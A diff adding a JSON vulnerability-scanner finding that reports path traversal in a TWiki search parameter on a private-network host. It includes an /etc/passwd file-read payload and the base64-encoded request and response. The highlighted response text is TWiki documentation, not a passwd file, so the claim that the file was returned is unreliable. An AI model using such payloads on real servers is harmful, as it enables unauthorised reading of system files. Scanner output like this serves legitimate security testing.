@@ -1,0 +1,97 @@
+{
+  "name": "File path traversal",
+  "type": "vulnerability",
+  "severity": "High",
+  "confidence": "Firm",
+  "host": "",
+  "path": "/twiki/bin/search/Main/",
+  "url": "/twiki/bin/search/Main/",
+  "evidence": [
+    {
+      "type": "FirstOrderEvidence",
+      "detail": {
+        "payload": {
+          "bytes": "L2V0Yy9wYXNzd2Q=",
+          "flags": 0
+        },
+        "band_flags": [
+          "in_band"
+        ]
+      },
+      "request_response": {
+        "url": "http://192.168.1.50/twiki/bin/search/Main/?scope=text&web=on&bookview=on&search=%2fetc%2fpasswd",
+        "request": [
+          {
+            "type": "DataSegment",
+            "data": "R0VUIC90d2lraS9iaW4vc2VhcmNoL01haW4vP3Njb3BlPXRleHQmd2ViPW9uJmJvb2t2aWV3PW9uJnNlYXJjaD0=",
+            "length": 65
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "JTJmZXRjJTJmcGFzc3dk",
+            "length": 15
+          },
+          {
+            "type": "DataSegment",
+            "data": "IEhUVFAvMS4xDQpIb3N0OiAxOTIuMTY4LjEuNTANCkNhY2hlLUNvbnRyb2w6IG1heC1hZ2U9MA0KU2VjLUNILVVBOiAiR29vZ2xlIENocm9tZSI7dj0iMTM4IiwgIk5vdD1BP0JyYW5kIjt2PSI4IiwgIkNocm9taXVtIjt2PSIxMzgiDQpTZWMtQ0gtVUEtTW9iaWxlOiA/MA0KU2VjLUNILVVBLVBsYXRmb3JtOiAiTGludXgiDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTO3E9MC45LGVuO3E9MC44DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCB4ODZfNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzguMC4wLjAgU2FmYXJpLzUzNy4zNg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNClNlYy1GZXRjaC1TaXRlOiBub25lDQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1Vc2VyOiA/MQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KUmVmZXJlcjogaHR0cDovLzE5Mi4xNjguMS41MC90d2lraS9iaW4vdmlldy9NYWluL1dlYlNlYXJjaA0KQ29udGVudC1MZW5ndGg6IDANCg0K",
+            "length": 744
+          }
+        ],
+        "response": [
+          {
+            "type": "DataSegment",
+            "data": "SFRUUC8xLjEgMjAwIE9LDQpEYXRlOiBUdWUsIDAyIFNlcCAyMDI1IDE1OjQxOjM3IEdNVA0KU2VydmVyOiBBcGFjaGUvMi4yLjggKFVidW50dSkgREFWLzINCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNjU5NTUNCg0KPCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sOmxhbmc9ImVuIiBsYW5nPSJlbiI+IAo8aGVhZD4KIDw=",
+            "length": 380
+          },
+          {
+            "type": "SnipSegment",
+            "length": 40049
+          },
+          {
+            "type": "DataSegment",
+            "data": "IFdpbmRvd3MsICRzYWZlRW52UGF0aCBuZWVkcyBvbmx5IG9uZSBjb21wb25lbnQsIHRoZSBkaXJlY3Rvcnkgd2hlcmUgUkNTIGlzIGluc3RhbGxlZAojIC0gdXNlZCBieSAncmNzZGlmZicgdG8gcnVuICdjbycgcHJvZ3JhbSwgc28gUEFUSCBtdXN0IGJlIGNvcnJlY3QuCgojIFVuaXgvTGludXggc2V0dGluZzoKIyAkc2FmZUVudlBhdGggICAgICA9ICIv",
+            "length": 201
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "YmluOg==",
+            "length": 4
+          },
+          {
+            "type": "DataSegment",
+            "data": "L3Vzci9iaW4iOwoKIyBVc2luZyBDeWd3aW4gcGVybCwgc28gY2FuIHVzZSBVbml4LWxpa2UgcGF0aHMsIHdpdGggJzonIGFzIHNlcGFyYXRvci4KIyBOb3RlIHRoYXQgL3Vzci9iaW4gYW5kIC9iaW4gYXJlIGlkZW50aWNhbCBkdWUgdG8gZGVmYXVsdCAvdXNyL2JpbiBtb3VudAojIGluIEN5Z3dpbi4gIE11c3QgTk9UIHVzZSAnYzovZm9vJyB0eXBlIHBh",
+            "length": 201
+          },
+          {
+            "type": "SnipSegment",
+            "length": 10992
+          },
+          {
+            "type": "DataSegment",
+            "data": "PC9zdHJvbmc+OiBUaGUgJ05SICZsdDs9IDEwJyBwYXJ0IG9mIHRoZSBQZXJsIGNvbW1hbmQgZW5zdXJlcyB0aGF0IGl0IG9ubHkgb3BlcmF0ZXMgb24gdGhlIGZpcnN0IDEwIGxpbmVzLCB0byBhdm9pZCBlZGl0aW5nIHRoZSBib2R5IG9mIFJDUyBmaWxlcyBmb3IgdG9waWNzIHRoYXQgaGFwcGVuIHRvIGluY2x1ZGUgdGhlIHRleHQgJw==",
+            "length": 190
+          },
+          {
+            "type": "HighlightSegment",
+            "data": "bm9ib2R5Og==",
+            "length": 7
+          },
+          {
+            "type": "DataSegment",
+            "data": "JyAobGlrZSB0aGlzIG9uZS4uLikKPC9saT4=",
+            "length": 26
+          },
+          {
+            "type": "SnipSegment",
+            "length": 14085
+          }
+        ],
+        "was_redirect_followed": false,
+        "request_time": "1756827713974"
+      }
+    }
+  ],
+  "description": "The <b>search</b> parameter is vulnerable to path traversal attacks, enabling read access to arbitrary files on the server.<br><br>The payload <b>/etc/passwd</b> was submitted in the search parameter. The requested file was returned in the application's response.",
+  "remediation": "",
+  "references": []
+}
